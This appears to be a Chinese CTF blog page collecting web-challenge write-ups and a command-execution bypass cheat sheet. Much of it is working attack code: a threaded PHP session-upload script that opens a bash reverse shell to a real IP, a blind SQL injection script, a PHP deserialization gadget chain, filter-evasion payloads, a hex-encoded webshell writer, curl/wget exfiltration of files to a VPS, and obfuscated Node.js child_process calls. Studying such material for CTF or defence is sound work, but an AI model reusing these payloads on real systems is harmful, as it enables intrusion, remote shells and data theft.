<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">sess_id=<span class="string">&quot;tlife&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line">url=<span class="string">&quot;http://&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">session_upload</span>():</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        res= s.post(</span><br><span class="line">            url=<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/?page=/tmp/session/sess_<span class="subst">&#123;sess_id&#125;</span>&quot;</span>,</span><br><span class="line">            data=&#123;</span><br><span class="line">                <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&quot;&lt;?=`bash -c &#x27;bash -i &gt;&amp; /dev/tcp/110.42.133.120/9999 0&gt;&amp;1&#x27;`;?&gt;&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            files=&#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&#x27;xxx.txt&#x27;</span>, open(<span class="string">&quot;shell.txt&quot;</span>, <span class="string">&quot;r&quot;</span>))&#125;,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sess_id&#125;</span><br><span class="line">        )</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    thread=threading.Thread(target=session_upload)</span><br><span class="line">    thread.start()</span><br></pre></td></tr></table></figure>

<p>就可以了~</p>
<h2 id="1119"><a href="#1119" class="headerlink" title="1119"></a>1119</h2><p>看了一下过滤了最重要的info库，就意味着大概率是无列名盲注了，然后过滤了一些比较符号，还有like、rlike等正则匹配函数，那么本题似乎只能用case when了的感觉<br>接下</p>
<p>判断注入类型</p>
<p>布尔盲注，回显分为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">测试语句：:root&#39;and&#x2F;**&#x2F;case&#x2F;**&#x2F;1&#x2F;**&#x2F;when&#x2F;**&#x2F;1&#x2F;**&#x2F;then&#x2F;**&#x2F;1&#x2F;**&#x2F;else&#x2F;**&#x2F;0&#x2F;**&#x2F;end#</span><br><span class="line">true:welcomt admin</span><br><span class="line">false:wrong</span><br></pre></td></tr></table></figure>

<p>编写盲注脚本：</p>
<p>构造注入语句</p>
<p>这题的截取函数基本都过滤了，所以这里使用<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210818110110.png" alt="img" style="zoom:67%;"></p>
<p>接下来就是跑表名，由于in库被过滤了，这里试了一下 发现</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select group_concat(table_name) from sys.schema_table_statistics;</span><br></pre></td></tr></table></figure>

<p>是可以的<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210818205724.png" alt="img"></p>
<p>就可以跑出表名了<br>接下来使用union无列名盲注</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select a.1 from (select 1,2 union select * from &#96;SeCrrreT&#96;)a limit 1,2</span><br></pre></td></tr></table></figure>

<p>得到表名以后 直接select * from SeCrrreT跑不出来，所以可以猜想肯定不止一行，所以后面要加limit 然后用无列名盲注，去尝试字段数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url=<span class="string">&quot;http://a.y1ng.vip:1119/&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sql_injection</span>(<span class="params">payload</span>):</span></span><br><span class="line">    data1=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">            payload_tr=<span class="string">f&quot;root&#x27;and case ascii(reverse(left((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>))) when <span class="subst">&#123;j&#125;</span> then 1 else 0 end#&quot;</span>.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;/**/&quot;</span>)</span><br><span class="line">            data=&#123;</span><br><span class="line">                <span class="string">&quot;username&quot;</span>:payload_tr,</span><br><span class="line">                <span class="string">&quot;password&quot;</span>:<span class="string">&quot;1141&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            r=s.post(url=url,data=data).text</span><br><span class="line">            <span class="comment">#print(r)</span></span><br><span class="line">            <span class="comment">#print(data)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Welcome Admin!&quot;</span> <span class="keyword">in</span> r:</span><br><span class="line">                data1+=chr(j)</span><br><span class="line">                print(data1)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment">#payload=&quot;database()&quot;#ctfgame</span></span><br><span class="line">    <span class="comment">#payload=&quot;select group_concat(table_name) from sys.schema_table_statistics&quot;#users,SeCrrreT</span></span><br><span class="line">    payload=<span class="string">&quot;select a.1 from (select 1,2 union select * from `SeCrrreT`)a limit 1,2&quot;</span><span class="comment">#flag&#123;fab99a66-23db-47b1-9db4-9262664d76a8&#125;</span></span><br><span class="line">    sql_injection(payload)</span><br></pre></td></tr></table></figure>

</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/08/30/2021%E7%A5%A5%E4%BA%91%E6%9D%AF%E9%A2%98%E8%A7%A3/">2021祥云杯web题解</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-08-30</time><div class="content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>就做了俩题，另外一题还是赛后半小时后才做出来，太太太太太太太太太太太菜了</p>
<h2 id="ezyii"><a href="#ezyii" class="headerlink" title="ezyii"></a>ezyii</h2><p>网上有现成的链子 拿到直接打就行了，后面在研究一下过程吧</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Codeception</span>\<span class="title">Extension</span>&#123;</span><br><span class="line">	<span class="title">use</span> <span class="title">Faker</span>\<span class="title">DefaultGenerator</span>;</span><br><span class="line">	<span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Psr7</span>\<span class="title">AppendStream</span>;</span><br><span class="line">	<span class="class"><span class="keyword">class</span>  <span class="title">RunProcess</span></span>&#123;</span><br><span class="line">		<span class="keyword">protected</span> $output;</span><br><span class="line">		<span class="keyword">private</span> $processes = [];</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;processes[]=<span class="keyword">new</span> DefaultGenerator(<span class="keyword">new</span> AppendStream());</span><br><span class="line">			<span class="keyword">$this</span>-&gt;output=<span class="keyword">new</span> DefaultGenerator(<span class="string">&#x27;jiang&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> RunProcess()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">	<span class="title">class</span> <span class="title">DefaultGenerator</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title">protected</span> $<span class="title">default</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$default = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;default = $default;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">GuzzleHttp</span>\<span class="title">Psr7</span>&#123;</span><br><span class="line">	<span class="title">use</span> <span class="title">Faker</span>\<span class="title">DefaultGenerator</span>;</span><br><span class="line">	<span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">AppendStream</span></span>&#123;</span><br><span class="line">		<span class="keyword">private</span> $streams = [];</span><br><span class="line">		<span class="keyword">private</span> $seekable = <span class="literal">true</span>;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;streams[]=<span class="keyword">new</span> CachingStream();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">CachingStream</span></span>&#123;</span><br><span class="line">		<span class="keyword">private</span> $remoteStream;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;remoteStream=<span class="keyword">new</span> DefaultGenerator(<span class="literal">false</span>);</span><br><span class="line">			<span class="keyword">$this</span>-&gt;stream=<span class="keyword">new</span>  PumpStream();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">PumpStream</span></span>&#123;</span><br><span class="line">		<span class="keyword">private</span> $source;</span><br><span class="line">		<span class="keyword">private</span> $size=<span class="number">-10</span>;</span><br><span class="line">		<span class="keyword">private</span> $buffer;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;buffer=<span class="keyword">new</span> DefaultGenerator(<span class="string">&#x27;j&#x27;</span>);</span><br><span class="line">			<span class="keyword">include</span>(<span class="string">&quot;closure/autoload.php&quot;</span>);</span><br><span class="line">			$a = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;system(<span class="string">&#x27;cat /flag.txt&#x27;</span>);phpinfo();	&#125;;</span><br><span class="line">			$a = \Opis\<span class="built_in">Closure</span>\serialize($a);</span><br><span class="line">			$b = unserialize($a);</span><br><span class="line">			<span class="keyword">$this</span>-&gt;source=$b;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="安全检测"><a href="#安全检测" class="headerlink" title="安全检测"></a>安全检测</h2><p>这题的就在于扫扫扫扫描。。。。。。也就是信息收集</p>
<p>首先是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.login.php.swp</span><br></pre></td></tr></table></figure>

<p>有源码，然后username可控</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//error_reporting(0);</span></span><br><span class="line">ob_start();</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check3</span>(<span class="params">$username</span>)</span>&#123;</span><br><span class="line">	$pattern = <span class="string">&quot;\/\*|\*|\.\.\/|\.\/|&lt;|&gt;|\?|\*|load_file|outfile|dumpfile|sub|hex|where&quot;</span>;</span><br><span class="line">	$pattern .= <span class="string">&quot;|file_put_content|file_get_content|fwrite|curl|system|eval|assert&quot;</span>;</span><br><span class="line">	$pattern .= <span class="string">&quot;|select|insert|update|delete|load_file|into outfile|drop&quot;</span>;</span><br><span class="line">	$pattern .=<span class="string">&quot;|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore&quot;</span>;</span><br><span class="line">	$pattern .=<span class="string">&quot;|`|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec|http|.php|.ph|\@|:\/\/|flag&quot;</span>;</span><br><span class="line">	$pattern .=<span class="string">&quot;|file|dict|gopher&quot;</span>;</span><br><span class="line"></span><br><span class="line">	$vpattern = explode(<span class="string">&quot;|&quot;</span>,$pattern);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">foreach</span>($vpattern <span class="keyword">as</span> $value)&#123;	</span><br><span class="line">		<span class="keyword">if</span> (preg_match( <span class="string">&quot;/<span class="subst">$value</span>/i&quot;</span>, $username ))&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;æ£€æµ‹åˆ°æ¶æ„å­—ç¬¦&quot;</span>;</span><br><span class="line">			<span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username=file_get_content(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line">check3($username);</span><br><span class="line">$username=json_decode($username)-&gt;username;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>($username)&#123;</span><br><span class="line">	$_SESSION[<span class="string">&#x27;user1&#x27;</span>]=$username;</span><br><span class="line">	Header(<span class="string">&quot;Location:./index.php&quot;</span>);</span><br><span class="line">	ob_end_flush();</span><br><span class="line">	<span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以发现session_start()函数，username又存入session中，大概率就是session文件包含了，于是再找找哪里能继续包含内容<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210823142410.png" alt="img" style="zoom:67%;"><br>在后面输入url窗口那里，发现输入这个，可以读到include123.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1&#x2F;admin&#x2F;include123.php</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210823142529.jpg" alt="img" style="zoom:50%;">
然后这里就有一个include函数，那么就可以实现session文件包含了

<p><strong>解法一：</strong></p>
<p>利用username进行session文件包含，由于后面使用了json_decode，所以我们可以使用unioncode编码输入内容，这样就就可以绕过前面的过滤了<br>PS:一开始一直没成功，后面才知道是实体化编码的问题，输入的内容虽然可以正常显示 但已经不是原本的东西了，其中就是&lt;这个编码错误了，这个是学长给的unioncode编码脚本，用这个就行了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">UNICODE</span>(<span class="params">payload</span>):</span></span><br><span class="line">	<span class="comment">#unicode</span></span><br><span class="line">	res_payload = <span class="string">&quot;&quot;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">		i = <span class="string">&quot;\\u00&#123;&#125;&quot;</span>.format(hex(ord(i))[<span class="number">2</span>:])</span><br><span class="line">		res_payload += i</span><br><span class="line">	print(<span class="string">&quot;[+]&#x27;&#123;&#125;&#x27; Convert to UNICDOE: \&quot;&#123;&#125;\&quot;&quot;</span>.format(payload,res_payload))</span><br></pre></td></tr></table></figure>

<p>直接上网站加密就没成功了。。看下面这个<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210823143230.png" alt="img" style="zoom:67%;"></p>
<p><strong>payload</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;admin&#x2F;include123.php?u&#x3D;&#x2F;tmp&#x2F;sess_xxxx(你的session)</span><br></pre></td></tr></table></figure>

<p><strong>解法二：</strong></p>
<p>可以看到我们输入的链接最终也会在session文件里面出现，所以此时我们可以利用这个链接进行文件包含</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;admin&#x2F;include123.php?u&#x3D;&#x2F;tmp&#x2F;sess_xxxx(你的session)&amp;a&#x3D;&lt;?system(&#39;ls&#39;);?&gt;</span><br></pre></td></tr></table></figure>

<p>但是需要注意的是不能有空格，会被直接截断！，所以后面可以使用这个进行绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat$&#123;IFS&#125;$&#x2F;fl&quot;&quot;ag</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210823143616.png" alt="img" style="zoom: 50%;">
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210823143621.png" alt="img" style="zoom:50%;">

<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>还是太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太菜了，要走的路还很远，好好加油<br>反思一下这次这个安全监测应该可以很快做出来的，主要是信息收集得不行，太慢了，而且换了好几个工具有必要更新一下字典之类的了！</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/08/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%92%8C%E7%BB%95%E8%BF%87/">命令执行和绕过</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-08-26</time><div class="content"><h2 id="高危函数"><a href="#高危函数" class="headerlink" title="高危函数:"></a>高危函数:</h2><p>system()、exec()、shell_exec()、passthru()、pctnl_exec()、popen()、proc_open() 注：反引号是shell_exec()的别名</p>
<h2 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h2><p>程序过滤不严谨，导致用户可以将代码注入并执行。高危函数:eval()、assert()、preg_replace()、call_user_func()等等和命令执行的区别是：一个执行系统命令，一个执行PHP代码</p>
<h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$9</span><br><span class="line">&lt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&#123;cat,flag.php&#125;&#x2F;&#x2F; 用逗号实现了空格功能，需要用&#123;&#125;括起来</span><br><span class="line">%20</span><br><span class="line">%09</span><br></pre></td></tr></table></figure>

<h3 id="过滤某关键字"><a href="#过滤某关键字" class="headerlink" title="过滤某关键字"></a>过滤某关键字</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ca\t y1n\g.php反斜线绕过</span><br><span class="line">cat y1”ng.php 两个单引号绕过</span><br><span class="line">echo “Y2F0IHkxbmcucGhw” | base64 -d | bashbase64 编码绕过</span><br><span class="line">echo “6361742079316E672E706870” | xxd -r -p | bashhex 编码绕过</span><br><span class="line">cat y1 [n] g.php用[]匹配</span><br><span class="line">cat y1n*用*匹配任意</span><br><span class="line">cat y1n?</span><br><span class="line">cat y1&#123;a..z&#125;g </span><br></pre></td></tr></table></figure>

<h2 id="escapeshellcmd-escapeshellarg绕过"><a href="#escapeshellcmd-escapeshellarg绕过" class="headerlink" title="escapeshellcmd+escapeshellarg绕过"></a>escapeshellcmd+escapeshellarg绕过</h2><h2 id="无参数rce"><a href="#无参数rce" class="headerlink" title="无参数rce"></a>无参数rce</h2><p>shell_exec等无回显函数</p>
<h3 id="判断方法"><a href="#判断方法" class="headerlink" title="判断方法"></a>判断方法</h3><p>ls;sleep(3)</p>
<h3 id="复制法"><a href="#复制法" class="headerlink" title="复制法"></a>复制法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy flag.php flag.txt</span><br><span class="line">mv flag.php flag.txt</span><br><span class="line">cat flag.php &gt; flag.txt</span><br></pre></td></tr></table></figure>

<h3 id="压缩法"><a href="#压缩法" class="headerlink" title="压缩法"></a>压缩法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar cvf flag.tar flag.php #tar压缩</span><br><span class="line">tar zcvf flag.tar.gz flag.php  #tar解压</span><br><span class="line">zip flag.zip flag.php  #zip压缩</span><br><span class="line">unzip flag.zip  #zip解压</span><br></pre></td></tr></table></figure>

<h3 id="写shell法"><a href="#写shell法" class="headerlink" title="写shell法"></a>写shell法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo 3c3f706870206576616c28245f504f53545b3132335d293b203f3e|xxd -r -ps &gt; webshell.php</span><br><span class="line">&#x2F;&#x2F;echo &quot;&lt;?php @eval(\$_POST[123]); ?&gt;&quot; &gt; webshell.php</span><br></pre></td></tr></table></figure>

<h3 id="利用vps反弹shell"><a href="#利用vps反弹shell" class="headerlink" title="利用vps反弹shell"></a>利用vps反弹shell</h3><h4 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">在自己的公网服务器站点根目录写入php文件，内容如下：</span><br><span class="line">&lt;!-- record.php --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$data =$_GET[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">$f = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">fwrite($f,$data);</span><br><span class="line">fclose($f);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在目标服务器的测试点可以发送下面其中任意一条请求进行测试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;*.*.*.**&#x2F;record.php?data&#x3D;&#96;cat flag.php|base64&#96;</span><br><span class="line">wget http:&#x2F;&#x2F;*.*.*.*&#x2F;record.php?data&#x3D;&#96;cat flag.php|base64&#96;</span><br></pre></td></tr></table></figure>

<h4 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h4><p>1.在公网服务器监听监听端口</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">nc -lp <span class="number">9999</span>（端口号）</span><br></pre></td></tr></table></figure>

<p>2.向目标服务器发起http请求，执行curl命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl ip:9999</span><br></pre></td></tr></table></figure>

<p>参考<a target="_blank" rel="noopener" href="https://bbs.huaweicloud.com/blogs/detail/286904">https://bbs.huaweicloud.com/blogs/detail/286904</a></p>
<h2 id="nodejs-RCE"><a href="#nodejs-RCE" class="headerlink" title="nodejs RCE"></a>nodejs RCE</h2><h3 id="1-child-process"><a href="#1-child-process" class="headerlink" title="1.child_process"></a>1.child_process</h3><p>child_process是用来执行系统命令模块</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">require(&quot;child_process&quot;).exec(&quot;sleep 3&quot;);</span><br><span class="line">require(&quot;child_process&quot;).execSync(&quot;sleep 3&quot;);</span><br><span class="line">require(&quot;child_process&quot;).execFile(&quot;&#x2F;bin&#x2F;sleep&quot;,[&quot;3&quot;]); &#x2F;&#x2F;调用某个可执行文件，在第二个参数传args</span><br><span class="line">require(&quot;child_process&quot;).spawn(&#39;sleep&#39;, [&#39;3&#39;]);</span><br><span class="line">require(&quot;child_process&quot;).spawnSync(&#39;sleep&#39;, [&#39;3&#39;]);</span><br><span class="line">require(&quot;child_process&quot;).execFileSync(&#39;sleep&#39;, [&#39;3&#39;]);</span><br></pre></td></tr></table></figure>

<h3 id="2-nodejs中的命令执行过滤关键字"><a href="#2-nodejs中的命令执行过滤关键字" class="headerlink" title="2.nodejs中的命令执行过滤关键字"></a>2.nodejs中的命令执行过滤关键字</h3><h4 id="16进制编码绕过"><a href="#16进制编码绕过" class="headerlink" title="16进制编码绕过"></a>16进制编码绕过</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">require(&quot;child_process&quot;)[&quot;exe\x63Sync&quot;](&quot;curl 127.0.0.1:1234&quot;)</span><br></pre></td></tr></table></figure>

<h4 id="unicode编码"><a href="#unicode编码" class="headerlink" title="unicode编码"></a>unicode编码</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">require(&quot;child_process&quot;)[&quot;exe\u0063Sync&quot;](&quot;curl 127.0.0.1:1234&quot;)</span><br></pre></td></tr></table></figure>

<h4 id="加号拼接"><a href="#加号拼接" class="headerlink" title="加号拼接"></a>加号拼接</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">require(&#39;child_process&#39;)[&#39;exe&#39;%2b&#39;cSync&#39;](&#39;curl 127.0.0.1:1234&#39;)</span><br></pre></td></tr></table></figure>

<h4 id="模板字符串"><a href="#模板字符串" class="headerlink" title="模板字符串"></a>模板字符串</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">require(&#39;child_process&#39;)[&#96;$&#123;&#96;$&#123;&#96;exe&#96;&#125;cSync&#96;&#125;&#96;](&#39;curl 127.0.0.1:1234&#39;)</span><br></pre></td></tr></table></figure>

<h4 id="concat连接"><a href="#concat连接" class="headerlink" title="concat连接"></a>concat连接</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">require(&quot;child_process&quot;)[&quot;exe&quot;.concat(&quot;cSync&quot;)](&quot;curl 127.0.0.1:1234&quot;)</span><br></pre></td></tr></table></figure>

<h4 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eval(Buffer.from(&#39;Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJjdXJsIDEyNy4wLjAuMToxMjM0Iik&#x3D;&#39;,&#39;base64&#39;).toString())</span><br></pre></td></tr></table></figure>

<h4 id="Obejct-keys"><a href="#Obejct-keys" class="headerlink" title="Obejct.keys"></a>Obejct.keys</h4><p>实际上通过<code>require</code>导入的模块是一个<code>Object</code>，所以就可以用<code>Object</code>中的方法来操作获取内容。利用<code>Object.values</code>就可以拿到<code>child_process</code>中的各个函数方法，再通过数组下标就可以拿到<code>execSync</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">console.log(require(&#39;child_process&#39;).constructor&#x3D;&#x3D;&#x3D;Object)</span><br><span class="line">&#x2F;&#x2F;true</span><br><span class="line">Object.values(require(&#39;child_process&#39;))[5](&#39;curl 127.0.0.1:1234&#39;)</span><br></pre></td></tr></table></figure>

<h4 id="Reflect"><a href="#Reflect" class="headerlink" title="Reflect"></a>Reflect</h4><p>在js中，需要使用<code>Reflect</code>这个关键字来实现反射调用函数的方式。譬如要得到<code>eval</code>函数，可以首先通过<code>Reflect.ownKeys(global)</code>拿到所有函数，然后<code>global[Reflect.ownKeys(global).find(x=&gt;x.includes(&#39;eval&#39;))]</code>即可得到eval</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Reflect</span>.ownKeys(<span class="built_in">global</span>))</span><br><span class="line"><span class="comment">//返回所有函数</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">global</span>[<span class="built_in">Reflect</span>.ownKeys(<span class="built_in">global</span>).find(<span class="function"><span class="params">x</span>=&gt;</span>x.includes(<span class="string">&#x27;eval&#x27;</span>))])</span><br><span class="line"><span class="comment">//拿到eval</span></span><br></pre></td></tr></table></figure>

<p>拿到eval之后，就可以常规思路rce了</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">global</span>[<span class="built_in">Reflect</span>.ownKeys(<span class="built_in">global</span>).find(<span class="function"><span class="params">x</span>=&gt;</span>x.includes(<span class="string">&#x27;eval&#x27;</span>))](<span class="string">&#x27;global.process.mainModule.constructor._load(&quot;child_process&quot;).execSync(&quot;curl 127.0.0.1:1234&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>这里虽然有可能被检测到的关键字，但由于<code>mainModule</code>、<code>global</code>、<code>child_process</code>等关键字都在字符串里，可以利用上面提到的方法编码，譬如16进制。</p>
